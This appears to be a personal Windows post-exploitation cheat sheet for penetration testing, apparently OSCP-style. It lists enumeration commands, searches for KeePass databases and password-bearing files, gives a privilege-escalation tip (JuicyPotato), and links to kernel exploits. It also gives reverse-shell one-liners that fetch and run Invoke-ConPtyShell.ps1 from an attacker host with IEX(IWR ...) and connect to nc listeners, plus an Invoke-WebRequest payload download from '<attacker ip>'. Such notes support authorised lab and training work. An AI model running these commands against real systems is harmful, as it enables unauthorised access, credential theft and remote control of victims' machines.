```
Get-History

C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine

Get-ChildItem -Recurse

tree /f

Get-ChildItem -Recurse -Filter "proof.txt"

Get-ChildItem Env:

#SEARCH FOR PASSWORD MANAGER DBs

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

#SEARCH FOR SENSITIVE XAMMP INFO:

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

#SEARCH HOME DIR

Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

whoami /priv

If you have SEImpersonate, USE JUICYPOTATO!!! NOW!!!

#LIST OF THINGS WORTH CHECKING:

- Username and hostname |  whoami

- Group memberships of the current user | whoami /groups

- Existing users and groups | net user, Get-Localuser, Get-LocalGroup, Get-LocalGroupMember

- Operating system, version and architecture |systeminfo

- Network information | ipconfig /all, route print,netstat -ano

- Installed applications | Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

- Running processes  | Get-Process

```

TTY Upgrading

```
Upgrade TTY Windows

stty raw -echo; (stty size; cat) | nc -lvnp 8888

IEX(IWR [http://IP:80/Invoke-ConPtyShell.ps1](http://IP:80/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell IP 3001

stty size

nc -lvnp 3001

Wait For connection

ctrl+z

stty raw -echo; fg

[ENTER]

powershell IEX(IWR [http://IP:80/Invoke-ConPtyShell.ps1](http://IP/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell -RemoteIp IP -RemotePort 4444 -Rows 27 -Cols 129

stty size

nc -lvnp 3001

Wait For connection

ctrl+z

stty raw -echo; fg

[ENTER]

. .\script.ps1

Invoke-Script IP Port

IEX(IWR [http://IP:80/Invoke-ConPtyShell.ps1](http://IP/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows 27 -Cols 129
```

System enumeration (Kernel Exploits)

```
hostname
systeminfo
systeminfo | grep version
wmic qfe
wmic qfe get caption, descrition, install on, hotfix
wmic logicaldisk
wmic logicaldisk get caption, description, provdername

Go to Links:
https://github.com/SecWiki/windows-kernel-exploits

```

User enumeration

```
whoami
whoami /priv
whoami /groups
net user
net user username
net user administrator
net localgroup
net localgroup administrators

```

Network enumeration

```
ipconfig
ipconfig /all
arp -a
route print
netstat -ano

```

Password hunting

```
cd ..
SAM file 
findstr /si password *.txt (Only searching within current directory)
findstr /si password *.txt *.ini *.config

Go to Links:
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

```

AV enumeration

```
sc query windefend
sc queryex type= service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config 


```

Misc

```
Invoke-WebRequest -OutFile file.exe http://<attacker ip>:<attacker port>/file.exe
```

